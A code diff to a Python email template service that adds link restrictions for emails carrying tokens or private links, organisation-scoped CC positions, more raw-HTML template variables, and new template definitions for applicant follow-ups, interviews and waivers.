+                User.organization_id == str(organization_id),
+                User.status.in_(ACTIVE_ACCOUNT_STATUSES),
+                User.deleted_at.is_(None),
+            )
+            .order_by(User.last_name, User.first_name)
+        )
+        return [email for (email,) in rows.all() if email]
 
     async def is_switched_off(
         self, organization_id: str, template_type: EmailTemplateType
@@ -3724,6 +4543,15 @@ class EmailTemplateService:
                 "This email cannot be switched off: its recipient has no "
                 "other way to receive what it carries"
             )
+        if "html_body" in fields and is_always_sent(template.template_type):
+            refused = protected_template_link_problems(fields["html_body"])
+            if refused:
+                raise ValueError(
+                    "This email carries a password, token or private link, so it "
+                    "may only link to this system's own address, a placeholder "
+                    "on its own, mailto: or tel:. Remove: "
+                    + ", ".join(sorted(set(refused))[:5])
+                )
 
         # An allowlist, not a skip list: `fields` arrives as **kwargs, so a
         # caller could otherwise name `id` or `organization_id` and move a
@@ -3741,11 +4569,25 @@ class EmailTemplateService:
             "allow_attachments",
             "default_cc",
             "default_bcc",
+            "default_cc_position_ids",
             "footer_key",
             "header_accent",
             "status_chip",
             "layout",
         }
+        if fields.get("default_cc_position_ids"):
+            # A stored id from another department would copy nobody, but it
+            # must not be stored either (pitfall #14c).
+            from app.models.user import Position
+            from app.utils.org_scoping import assert_all_in_org
+
+            await assert_all_in_org(
+                self.db,
+                Position,
+                fields["default_cc_position_ids"],
+                str(organization_id),
+                label="CC position",
+            )
         # apply_updates, not `if value is not None`. That guard collapses
         # "the caller did not mention this field" and "the caller sent an
         # explicit null to clear it" into one case, so emptying the CC box
@@ -4300,45 +5142,53 @@ class EmailTemplateService:
     # Variable names whose values contain pre-rendered, system-generated
     # HTML (e.g. item tables, logo <img> tags).  These are built by
     # trusted backend code and must NOT be HTML-escaped during rendering.
-    _RAW_HTML_VARIABLES: set = {
-        # render()'s appendix: built and escaped by the caller.
-        _APPENDIX_HTML_VAR,
-        "items_list_html",
-        "items_issued_html",
-        "items_returned_html",
-        "items_removed_html",
-        "organization_logo_img",
-        "organization_logo_cell",
-        "organization_logo_block",
-        # Hexes going into style attributes. Escaping a "#" is a no-op, but
-        # listing them keeps the set honest about what is markup-bearing.
-        "header_accent",
-        "chip_tint",
-        # The chip cell is markup, not text — it is built by
-        # colourway_context, which escapes the chip's own wording. The
-        # status line is built the same way.
-        "status_chip_cell",
-        "status_line",
-        "content_class",
-        "ballot_items_html",
-        "results_html",
-        "ballot_recipients_html",
-        "recipients_html",
-        "skipped_voters_html",
-        "custom_message_html",
-        "meeting_date_html",
-        "ballot_link_notice_html",
-        "footer_html",
-        "details_html",
-        # Built by external_course_mapping._course_lines, which escapes every
-        # course name and id it inserts.
-        "courses_html",
-        "message_html",
-        "notes_html",
-        "apparatus_html",
-        "roster_html",
-        "checklist_html",
-    } | _storefront_templates.RAW_HTML_VARIABLES
+    _RAW_HTML_VARIABLES: set = (
+        {
+            # render()'s appendix: built and escaped by the caller.
+            _APPENDIX_HTML_VAR,
+            "items_list_html",
+            # Fixed sentences the follow-up senders build; they never carry a
+            # value from a person.
+            "draft_note_html",
+            "contact_note_html",
+            "items_issued_html",
+            "items_returned_html",
+            "items_removed_html",
+            "organization_logo_img",
+            "organization_logo_cell",
+            "organization_logo_block",
+            # Hexes going into style attributes. Escaping a "#" is a no-op, but
+            # listing them keeps the set honest about what is markup-bearing.
+            "header_accent",
+            "chip_tint",
+            # The chip cell is markup, not text — it is built by
+            # colourway_context, which escapes the chip's own wording. The
+            # status line is built the same way.
+            "status_chip_cell",
+            "status_line",
+            "content_class",
+            "ballot_items_html",
+            "results_html",
+            "ballot_recipients_html",
+            "recipients_html",
+            "skipped_voters_html",
+            "custom_message_html",
+            "meeting_date_html",
+            "ballot_link_notice_html",
+            "footer_html",
+            "details_html",
+            # Built by external_course_mapping._course_lines, which escapes every
+            # course name and id it inserts.
+            "courses_html",
+            "message_html",
+            "notes_html",
+            "apparatus_html",
+            "roster_html",
+            "checklist_html",
+        }
+        | _storefront_templates.RAW_HTML_VARIABLES
+        | _waiver_templates.RAW_HTML_VARIABLES
+    )
 
     def _replace_variables(
         self, text: str, context: Dict[str, Any], escape_html: bool = True
@@ -4692,6 +5542,100 @@ class EmailTemplateService:
             ),
         },
         {
+            "type": EmailTemplateType.APPLICATION_FOLLOW_UP_FORM,
+            "footer": "public",
+            "name": "Application Follow-up Form",
+            "subject": DEFAULT_APPLICATION_FOLLOW_UP_FORM_SUBJECT,
+            "html": DEFAULT_APPLICATION_FOLLOW_UP_FORM_HTML,
+            "text": DEFAULT_APPLICATION_FOLLOW_UP_FORM_TEXT,
+            "description": (
+                "Sent to an applicant by a Follow-up Form stage, with their "
+                "personal link to the form."
+            ),
+        },
+        {
+            "type": EmailTemplateType.APPLICATION_CONTACT_CHANGED,
+            "footer": "public",
+            "name": "Application Contact Details Changed",
+            "subject": DEFAULT_APPLICATION_CONTACT_CHANGED_SUBJECT,
+            "html": DEFAULT_APPLICATION_CONTACT_CHANGED_HTML,
+            "text": DEFAULT_APPLICATION_CONTACT_CHANGED_TEXT,
+            "description": (
+                "Sent to an applicant's previous email address when a "
+                "follow-up form changes it."
+            ),
+        },
+        {
+            "type": EmailTemplateType.APPLICATION_FOLLOW_UP_REMINDER,
+            "footer": "public",
+            "name": "Application Follow-up Form Reminder",
+            "subject": DEFAULT_APPLICATION_FOLLOW_UP_REMINDER_SUBJECT,
+            "html": DEFAULT_APPLICATION_FOLLOW_UP_REMINDER_HTML,
+            "text": DEFAULT_APPLICATION_FOLLOW_UP_REMINDER_TEXT,
+            "description": (
+                "Sent to an applicant every seven days, up to three times, "
+                "while a follow-up form is unsubmitted."
+            ),
+        },
+        {
+            "type": EmailTemplateType.APPLICATION_FOLLOW_UP_SUBMITTED,
+            "name": "Application Follow-up Form Submitted",
+            "subject": DEFAULT_APPLICATION_FOLLOW_UP_SUBMITTED_SUBJECT,
+            "html": DEFAULT_APPLICATION_FOLLOW_UP_SUBMITTED_HTML,
+            "text": DEFAULT_APPLICATION_FOLLOW_UP_SUBMITTED_TEXT,
+            "description": (
+                "Sent to the membership coordinators when an applicant "
+                "submits a follow-up form. Carries a link only, never the "
+                "answers."
+            ),
+        },
+        {
+            "type": EmailTemplateType.APPLICATION_ASSIGNED,
+            "name": "Applicant Assigned",
+            "subject": DEFAULT_APPLICATION_ASSIGNED_SUBJECT,
+            "html": DEFAULT_APPLICATION_ASSIGNED_HTML,
+            "text": DEFAULT_APPLICATION_ASSIGNED_TEXT,
+            "description": (
+                "Sent to a member assigned to an applicant as case manager or "
+                "interviewer, with a link to their My Applicants page."
+            ),
+        },
+        {
+            "type": EmailTemplateType.APPLICATION_NEEDS_ATTENTION,
+            "name": "Applicant Needs Your Attention",
+            "subject": DEFAULT_APPLICATION_NEEDS_ATTENTION_SUBJECT,
+            "html": DEFAULT_APPLICATION_NEEDS_ATTENTION_HTML,
+            "text": DEFAULT_APPLICATION_NEEDS_ATTENTION_TEXT,
+            "description": (
+                "Sent to an applicant's case managers when the applicant "
+                "submits a follow-up form, withdraws, or reaches an interview "
+                "or sign-off stage. Carries a link only."
+            ),
+        },
+        {
+            "type": EmailTemplateType.APPLICATION_INTERVIEW_REQUESTED,
+            "name": "Interview Requested",
+            "subject": DEFAULT_APPLICATION_INTERVIEW_REQUESTED_SUBJECT,
+            "html": DEFAULT_APPLICATION_INTERVIEW_REQUESTED_HTML,
+            "text": DEFAULT_APPLICATION_INTERVIEW_REQUESTED_TEXT,
+            "description": (
+                "Sent to an applicant's assigned interviewers when the "
+                "applicant reaches an Interview Requirement stage, with a link "
+                "to the Interview page."
+            ),
+        },
+        {
+            "type": EmailTemplateType.SHIFT_EVALUATION_PRECEPTOR_LINK,
+            "name": "Shift Evaluation Preceptor Link",
+            "subject": DEFAULT_SHIFT_EVALUATION_PRECEPTOR_LINK_SUBJECT,
+            "html": DEFAULT_SHIFT_EVALUATION_PRECEPTOR_LINK_HTML,
+            "text": DEFAULT_SHIFT_EVALUATION_PRECEPTOR_LINK_TEXT,
+            "description": (
+                "Sent to an outside agency's preceptor with the no-login link "
+                "to a member's shift evaluation."
+            ),
+        },
+        {
             "type": EmailTemplateType.SUGGESTION_SUBMITTED,
             "name": "Suggestion Submitted",
             "subject": DEFAULT_SUGGESTION_SUBMITTED_SUBJECT,
@@ -4786,6 +5730,12 @@ class EmailTemplateService:
         # email_templates_storefront.py for why they need raw-HTML
         # variables where other templates need none.
         *_storefront_templates.DEFAULT_TEMPLATE_DEFS,
+        # Performance evaluations' four notices; see
+        # email_templates_evaluations.py.
+        *_evaluation_templates.DEFAULT_TEMPLATE_DEFS,
+        # Attendance waiver requests, for training sessions and business
+        # meetings; see email_templates_attendance_waivers.py.
+        *_waiver_templates.DEFAULT_TEMPLATE_DEFS,
     ]
 
     # Stamp each definition with the colourway build_shell recorded for its
